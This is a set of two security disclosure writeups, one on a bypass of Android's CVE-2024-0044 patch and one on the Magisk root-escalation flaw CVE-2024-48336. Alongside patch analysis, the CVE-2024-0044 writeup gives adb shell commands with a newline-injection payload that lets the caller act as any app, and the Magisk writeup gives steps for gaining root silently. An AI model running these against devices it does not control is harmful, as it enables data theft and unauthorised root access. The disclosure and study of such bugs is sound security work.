<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-canyie
description: CTF writeups and security challenges by canyie.
---

# Writeups by canyie

Source repository: `/repos/canyie`

## Repository Index

- CVE-2024-0044/README.md
- MagiskEoP/README.md

## Writeup Content


### File: CVE-2024-0044/README.md

[CVE-2024-0044/A-307532206](https://nvd.nist.gov/vuln/detail/CVE-2024-0044) is a High severity vulnerability in the Android framework that allows attackers with adb access to run arbitrary code under the UID of arbitrary app. It was originally found by Tom Hebb from Meta Red Team X. You can found many articles on exploit this vulnerability on the Internet such as [this](https://www.mobile-hacker.com/2024/06/17/exfiltrate-sensitive-user-data-from-apps-on-android-12-and-13-using-cve-2024-0044-vulnerability/) and [this](https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/). For more info, check this blog: https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.html

[The patch](https://android.googlesource.com/platform/frameworks/base/+/65bd134b0a82c51a143b89821d5cdd00ddc31792) for this vulnerability is included in the [March 2024 Android Security Bulletin](https://source.android.com/docs/security/bulletin/2024-03-01), but now I come up with an exploit that bypasses the patch. The new patch is included in [October 2024 Android Security Bulletin](https://source.android.com/docs/security/bulletin/2024-10-01) under the same CVE ID CVE-2024-0044. Android 12-13 devices with security patch level before 2024-10-01 are vulnerable to this issue.

This repo contains a minimum reproducible PoC and a writeup.

## What's wrong with the original patch?
The patch added a validation for installer package name passed to the PackageManagerService:
```diff
diff --git a/services/core/java/com/android/server/pm/PackageInstallerService.java b/services/core/java/com/android/server/pm/PackageInstallerService.java
index 2ca3e8f..02515cf 100644
--- a/services/core/java/com/android/server/pm/PackageInstallerService.java
+++ b/services/core/java/com/android/server/pm/PackageInstallerService.java
@@ -47,6 +47,7 @@
 import android.content.pm.PackageManager;
 import android.content.pm.ParceledListSlice;
 import android.content.pm.VersionedPackage;
+import android.content.pm.parsing.ParsingPackageUtils;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Binder;
@@ -601,17 +602,22 @@
 
         // App package name and label length is restricted so that really long strings aren't
         // written to disk.
-        if (params.appPackageName != null
-                && params.appPackageName.length() > SessionParams.MAX_PACKAGE_NAME_LENGTH) {
+        if (params.appPackageName != null && !isValidPackageName(params.appPackageName)) {
             params.appPackageName = null;
         }
 
         params.appLabel = TextUtils.trimToSize(params.appLabel,
                 PackageItemInfo.MAX_SAFE_LABEL_LENGTH);
 
-        String requestedInstallerPackageName = (params.installerPackageName != null
-                && params.installerPackageName.length() < SessionParams.MAX_PACKAGE_NAME_LENGTH)
-                ? params.installerPackageName : installerPackageName;
+        // Validate installer package name.
+        if (params.installerPackageName != null && !isValidPackageName(
+                params.installerPackageName)) {
+            params.installerPackageName = null;
+        }
+
+        String requestedInstallerPackageName =
+                params.installerPackageName != null ? params.installerPackageName
+                        : installerPackageName;
 
         if ((callingUid == Process.SHELL_UID) || (callingUid == Process.ROOT_UID)) {
             params.installFlags |= PackageManager.INSTALL_FROM_ADB;
@@ -935,6 +941,19 @@
         throw new IllegalStateException("Failed to allocate session ID");
     }
 
+    private static boolean isValidPackageName(@NonNull String packageName) {
+        if (packageName.length() > SessionParams.MAX_PACKAGE_NAME_LENGTH) {
+            return false;
+        }
+        // "android" is a valid package name
+        String errorMessage = ParsingPackageUtils.validateName(
+                packageName, /* requireSeparator= */ false, /* requireFilename */ true);
+        if (errorMessage != null) {
+            return false;
+        }
+        return true;
+    }
+
```
You can see `params.installerPackageName` will be reset to null if it is not an legal Android package name. However, at the next line, `requestedInstallerPackageName` can be `installerPackageName` when `params.installerPackageName` is null or invalid.

What is `installerPackageName`?

Let's take a look at the `createSessionInternal` method, where the patch was added to:
```java
    @Override
    public int createSession(SessionParams params, String installerPackageName,
            String callingAttributionTag, int userId) {
        try {
            return createSessionInternal(params, installerPackageName, callingAttributionTag,
                    userId);
        } catch (IOException e) {
            throw ExceptionUtils.wrap(e);
        }
    }
    private int createSessionInternal(SessionParams params, String installerPackageName,
            String installerAttributionTag, int userId)
            throws IOException{
    }
```

You can see that `installerPackageName` is a separate argument that does not come from `param`. The original patch validated `params.installerPackageName`, but forgot to validate `installerPackageName`.

## Reproduction
You can just use the original exploit code from Tom Hebb's blog to reproduce it. This repo also contains a minimum reproducible PoC. If you want to test my PoC, just build it, push the generated apk to `/data/local/tmp/poc.apk`, then run the following code with `adb shell`:
```shell
APK=/data/local/tmp/poc.apk
PAYLOAD="@null
victim <victim uid> 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
app_process -Djava.class.path=$APK /system/bin top.canyie.cve_2024_0044.PoC "$APK" "$PAYLOAD"
run-as victim
```
replace `<victim uid>` with the UID of the victim app.

If you want to play the game again, run `adb uninstall top.canyie.cve_2024_0044` and re-run the code above.

## How it happened twice?
The issue looks obvious, how did it escape everyone's sight?

Well, Google did add [a test](https://cs.android.com/android/platform/superproject/+/main:cts/tests/tests/security/src/android/security/cts/CVE_2024_0044.java) for this issue to ensure it is fixed:
```java
            // Set vulnerable 'appPackageName' and 'installerPackageName'
            // for 'SessionParams' instance
            final String vulnPackageName =
                    context.getPackageName() + "\n" + context.getPackageName();
            final SessionParams params = new SessionParams(MODE_FULL_INSTALL);
            params.setAppPackageName(vulnPackageName);
            params.setInstallerPackageName(vulnPackageName);

            final List<String> vulnerableFields = new ArrayList<String>();
            runWithShellPermissionIdentity(
                    () -> {
                        // Create session using 'SessionParams' instance, get 'appPackageName' and
                        // 'installerPackageName' corresponding to session and abandon session later
                        final PackageInstaller packageInstaller =
                                context.getPackageManager().getPackageInstaller();
                        final int sessionId = packageInstaller.createSession(params);
                        final String vulnerableAppPackageName =
                                packageInstaller.getSessionInfo(sessionId).getAppPackageName();
                        final String vulnerableInstallerPackageName =
                                packageInstaller
                                        .getSessionInfo(sessionId)
                                        .getInstallerPackageName();
                        packageInstaller.abandonSession(sessionId);

                        // Without fix, 'appPackageName' and 'installerPackageName' does not undergo
                        // internal validation and are set to 'vulnPackageName' which contain '\n'
                        if (vulnerableAppPackageName != null
                                && vulnerableAppPackageName.contains("\n")) {
                            vulnerableFields.add("'SessionParams.appPackageName'");
                        }
                        if (vulnerableInstallerPackageName != null
                                && vulnerableInstallerPackageName.contains("\n")) {
                            vulnerableFields.add("'SessionParams.installerPackageName'");
                        }
                    });

            String errorMessage =
                    "Device is vulnerable to b/307532206 !!"
                            + " packages.list newline injection allows"
                            + " run-as as any app from ADB"
                            + " Due to : Fix is not present for ";
            assertWithMessage(errorMessage.concat(String.join(" , ", vulnerableFields)))
                    .that(vulnerableFields)
                    .isEmpty();
```
The test uses the public standard PackageInstaller API which does not allow customizing `installerPackageName`. In the public API, `installerPackageName` is always set to the real package name of provided Context:
```java
    public int createSession(@NonNull SessionParams params) throws IOException {
        try {
            return mInstaller.createSession(params, mInstallerPackageName, mAttributionTag,
                    mUserId);
        } catch (RuntimeException e) {
            ExceptionUtils.maybeUnwrapIOException(e);
            throw e;
        } catch (RemoteException e) {
            throw e.rethrowFromSystemServer();
        }
    }
```
When the caller is a 3rd-party app, `installerPackageName` is guaranteed to belong to the caller; when the caller is adb, it will always be reset to null, so this seems fine:
```java
        String requestedInstallerPackageName =
                params.installerPackageName != null ? params.installerPackageName
                        : installerPackageName;
        if ((callingUid == Process.SHELL_UID) || (callingUid == Process.ROOT_UID)) {
            params.installFlags |= PackageManager.INSTALL_FROM_ADB;
            // adb installs can override the installingPackageName, but not the
            // initiatingPackageName
            installerPackageName = null;
        } else {
            if (callingUid != Process.SYSTEM_UID) {
                // The supplied installerPackageName must always belong to the calling app.
                mAppOps.checkPackage(callingUid, installerPackageName);
            }
            // Only apps with INSTALL_PACKAGES are allowed to set an installer that is not the
            // caller.
            if (!TextUtils.equals(requestedInstallerPackageName, installerPackageName)) {
                if (mContext.checkCallingOrSelfPermission(Manifest.permission.INSTALL_PACKAGES)
                        != PackageManager.PERMISSION_GRANTED) {
                    mAppOps.checkPackage(callingUid, requestedInstallerPackageName);
                }
            }
        }
```
However, the operation occurs after `requestedInstallerPackageName` is set to `installerPackageName`, so the original value is kept.

But if they run the original PoC provided by Tom Hebb instead of writing their own, they can catch the problem as the pm command calls the underlying `createSession` method with customized `installerPackageName`.

One more question, why the problem isn't caught by someone else while the PoC is publicly accessible? 

Well, this vulnerability has been analyzed, reproduced and exploited by many people on the Internet, and there is an [article](https://mp.weixin.qq.com/s/PoGRFwUD736nkLocRGvP_g) written by Qidan He (flanker) of JD Dawn Security Lab (this is a very interesting article about CVE-2024-31317 btw) that says "其中CVE-2024-0044因简单直接，在技术社区已经有了广泛的分析和公开的exp" ("CVE-2024-0044 has been widely analyzed and publicly exploited in the technical community because it is simple and direct"), however no one noticed it as if every one were under a spell.

In fact, [someone has successfully reproduced the exploit on patched builds](https://bbs.kanxue.com/thread-282373.htm), but the author doesn't seem to realize what happened. I found it by a code review and reported it on May 16, 2024, 2 months after the original patch was released. If anyone before me would have taken a few extra seconds to carefully look at the patch, or just try running the PoC on patched builds to see whether the issue is actually fixed, the bug bounty would have been theirs. This sounds like a Chinese lyric, “再多看一眼就会爆炸”（"One more look and it will explode"）.





### File: MagiskEoP/README.md

## Introduction
This is an exploit for a vulnerability CVE-2024-48336 in Magisk app that allows a local app to silently gain root access without user consent. 

Vulnerability was initially reported by [@vvb2060](https://github.com/vvb2060) and PoC-ed by [@canyie](https://github.com/canyie). It has been fixed in Canary 27007.

Demo video for exploit this vulnerability to silently obtaining root privileges and granting root to any app: https://github.com/canyie/MagiskEoP/blob/main/screen-20220302-093745.mp4


Steps to reproduce this vulnerability:
1. Install vulnerable Magisk app builds on a device that has no GMS preinstalled
2. Install this exploit app
3. Force stop Magisk app and this exploit app
4. Open Magisk app
5. Open this exploit app, type your commands and press Execute to execute them with root privileges

## Vulnerability Info
Name: Magisk App Arbitrary Code Execution Vulnerability

Alias: Magisk Privilege Escalation Vulnerability

### The Basics
Product: Magisk

CVE: [CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)

Reporter: [@vvb2060](https://github.com/vvb2060)

Initial Report Date: 2024-08-01

Patch Date: 2024-08-21

Disclosure Date: 2024-08-24

Affected Versions: Manager v7.0.0 ~ Canary 27006

First Patched Versions: Canary 27007

Issue/Bug report: https://github.com/topjohnwu/Magisk/issues/8279

Patch CL: https://github.com/topjohnwu/Magisk/commit/c2eb6039579b8a2fb1e11a753cea7662c07bec02

Bug-introducing CL: https://github.com/topjohnwu/Magisk/commit/920b60da19212dd8d54d27ada77a30067ce50de6

Bug Class: Unsafe Dynamic External Code Loading

Weakness Enumerations:
- [CWE-386: Symbolic Name not Mapping to Correct Object](https://cwe.mitre.org/data/definitions/386.html)
- [CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)

### Summary
The install() function of ProviderInstaller.java in Magisk App before canary version 27007 does not verify the GMS app before loading it, which allows a local untrusted app with no additional privileges to silently execute arbitrary code in the Magisk app and escalate privileges to root via a crafted package, aka Bug #8279. User interaction is not needed for exploitation.

### Details
Old Android versions do not support some algorithms. To make Magisk work properly on these platforms, it tries to load conscrypt from GMS by calling [createCallingContext()](https://developer.android.com/reference/android/content/Context#createPackageContext(java.lang.String,%20int)). Check this link for more details: https://t.me/vvb2060Channel/692

However, GMS is not always preinstalled on all devices. Magisk assumes that loading code from GMS is always safe, however attackers can create a fake malicious app with the same package name. When Magisk app is launched, malicious code will get executed in Magisk app. Since Magisk app is always granted root access, this allows attackers to silently gain root access and execute arbitrary code with root privileges without user acceptance.

### Vulnerable Devices
- Devices with no GMS preinstalled
- Devices with broken signature verification implementation (e.g. Disabled by CorePatch)

Note: This issue is fixed in Canary 27007 by ensuring GMS is a system app before loading it. However, it's still possible to exploit this issue on devices with pre-installed GMS but have broken signature verification implementations (e.g. CorePatch).

Note 2: Although a fix for this issue is present in the official Magisk app, there are many other instances of similar code exist in other apps without a proper fix such as [this](https://github.com/Fox2Code/FoxMagiskModuleManager/blob/master/app/src/main/java/com/fox2code/mmm/utils/io/GMSProviderInstaller.java#L51) and [this](https://github.com/vvb2060/KeyAttestation/blob/master/app/src/main/java/io/github/vvb2060/keyattestation/AppApplication.kt#L37). This potentially allows an arbitrary code execution in vulnerable apps and potentially allows attackers to gain root access again if it is granted to victim apps.


